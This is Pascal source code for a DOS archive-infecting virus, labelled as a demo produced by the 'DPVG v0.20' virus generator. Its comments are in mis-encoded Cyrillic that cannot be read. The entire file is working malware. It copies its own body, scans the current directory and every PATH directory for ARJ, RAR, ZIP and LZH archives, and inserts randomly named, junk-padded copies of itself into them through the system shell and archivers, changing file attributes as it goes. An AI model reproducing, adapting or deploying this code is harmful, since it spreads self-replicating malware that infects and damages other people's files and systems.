   (* This file created with [DPVG] v0.20 generator (c) by Duke/SMF *)

   {$M 5000, 1000, 5000}
   {$S-,I-}  {íâ  áâà®ª  ¥®¡å®¤¨¬  ¤«ï ®¯â¨¬¨§ æ¨¨ ª®¤ }
   uses dos;
   const VirusSize= 6032 { *ã¦®¥ ¢¯¨á âì! };
   var Author,VirusName,Generator:string;
       arh:string;                {à áè¨à¥¨¥  àå¨¢ }
       Comman:string;             {áâà®ª  ¯®¤ COMSPEC}
       Virus:file;                {§ ¯ãé¥ë© ä ©«}
       VirusBody:array[1..VirusSize] of char;{â¥«® ¢¨àãá }
   {------------------}
   procedure Infect(name:string); {‡ à ¦¥¨¥  àå¨¢®¢}
   var par:string;                {¯ à ¬¥âàë § ¯ãáª  Command.COM}
       st:string;                 {¨¬ï á®§¤ ¢ ¥¬®£® ä ©« -¢¨àãá }
       i:integer;                 {¯à®¬¥¦ãâ®çë© áç¥âç¨ª}
       f,g:file;                  { àå¨¢ ¨ ç¥à¢ì}
       at:word;                   { âà¨¡ãâë ä ©« }
       ch:char;
   begin
   { ‘«ãç ©ë¬ ®¡à §®¬ á®§¤ ¥¬ ¨¬ï ä ©« -¢¨àãá : }
   st:='';
   for i:=1 to (random(8)+1) do st:=st+chr(random(26)+97);
   i:=random(4);
   if (i=0) or (i=3) then st:=st+'.exe' else st:=st+'.com';
   { ‘®§¤ ¥¬ ä ©«-ç¥à¢ì: }
   assign(g,st);rewrite(g,1);
   blockwrite(g,VirusBody,VirusSize);
   { ‘®§¤ ¥¬ ä ©«-¢¨àãá á«ãç ©®© ¤«¨ë: }
     for i:=1 to random(1000) do                {... ¯¨è¥¬ ¬ãá®à}
       begin
       ch:=chr(random(255));
       blockwrite(g,ch,1);
       end;
   close(g);
   { ‡ ¯¨áë¢ ¥¬ (¤®¡ ¢«ï¥¬) ¥£® ¢  àå¨¢: }
   assign(f,name);
   getfattr(f,at);
   setfattr(f,$20);
   par:='/c ';
   if arh='arj' then par:=par+'arj a ';
   if arh='rar' then par:=par+'rar a -tk -y -c- -o+ ';
   if arh='zip' then par:=par+'pkzip -a ';
   if arh='lzh' then par:=par+'lha a ';
   par:=par+name+' '+st+'>nul';
   exec(Comman,par);
   setfattr(f,at);
   erase(g);                      {ã¤ «ï¥¬ ¢¨àãá}
   end;
   {------------------}
   procedure FindArhiv(put:string);
   { *®¨áª  àå¨¢®¢ ¨ ¢ë§®¢ § à ¦¥¨ï }
   var N:searchrec;
   begin
   findfirst(put+'*.'+arh,$21,N);
   while doserror=0 do
     begin
     Infect(put+N.name);
     findnext(N);
     end
   end;
   {------------------}
   procedure Path(p:string);
   var t:integer;
   begin
   if p='' then exit;
   t:=pos(';',p);
   if t=0 then FindArhiv(p+'\')
          else begin
               FindArhiv(copy(p,1,t-1)+'\');
               Path(copy(p,t+1,length(p)-t));
               end;
   end;
   {------------------}
   begin
   Author:='Duke/SMF';
   VirusName:='DPVG Demo Virus';
   Generator:='[DPVG v0.20]';
   Comman:=GetEnv('COMSPEC');
   Randomize;
   assign(Virus,paramstr(0));reset(Virus,1);
   blockread(Virus,VirusBody,VirusSize);{ç¨â ¥¬ â¥«® ¢¨àãá }
   close(Virus);
   arh:='arj';FindArhiv('');Path(GetEnv('PATH'));
   arh:='rar';FindArhiv('');Path(GetEnv('PATH'));
   arh:='zip';FindArhiv('');Path(GetEnv('PATH'));
   arh:='lzh';FindArhiv('');Path(GetEnv('PATH'));
   writeln;
   writeln('This is [DPVG v0.20] Demo Virus');
   writeln('Created (c) by Duke/SMF');
   end.
